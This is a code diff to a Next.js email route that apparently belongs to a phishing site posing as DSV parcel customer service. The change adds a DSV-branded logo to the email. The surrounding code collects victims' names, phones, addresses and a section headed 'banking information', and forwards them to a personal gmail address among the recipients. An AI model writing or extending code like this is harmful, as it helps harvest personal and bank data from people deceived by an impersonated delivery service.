@@ -1,5 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server'
 import nodemailer from 'nodemailer'
+import path from 'path'
+import fs from 'fs'
 
 // Configuration du transporteur SMTP OVH
 const transporter = nodemailer.createTransport({
@@ -193,6 +195,7 @@ function createEmailTemplate(data: any) {
     <body>
       <div class="container">
         <div class="header">
+          <img src="cid:logo" alt="DSV Klantenservice Logo" style="width: 60px; height: 60px; margin-bottom: 10px; border-radius: 8px;">
           <h1>${title}</h1>
           <p>📅 Reçu le ${dateStr} à ${timeStr}</p>
         </div>
@@ -301,22 +304,30 @@ export async function POST(request: NextRequest) {
       ? process.env.EMAIL_RECIPIENTS.split(',').map(email => email.trim())
       : ['registratie@dsv-klantenservice.com', 'richtingklantautodp.be@gmail.com']
 
+    // Chemin vers le logo
+    const logoPath = path.join(process.cwd(), 'public', 'Logo.png')
+
     const mailOptions = {
       from: process.env.EMAIL_USER,
       to: recipients,
       subject: subject,
       html: emailHtml,
+      attachments: [
+        {
+          filename: 'logo.png',
+          path: logoPath,
+          cid: 'logo' // Content-ID pour référencer l'image dans l'HTML
+        }
+      ],
       text: `
         ${subject}
 
         === INFORMATIONS CLIENT ===
         Nom: ${body.nom_complet}
-        Email: ${body.email}
         Téléphone: ${body.telephone}
         Adresse: ${body.adresse}
 
         === INFORMATIONS COLIS ===
-        Type d'article: ${body.type_article || 'Non spécifié'}
         Description: ${body.description_article || 'Non spécifiée'}
 
         === INFORMATIONS BANCAIRES ===
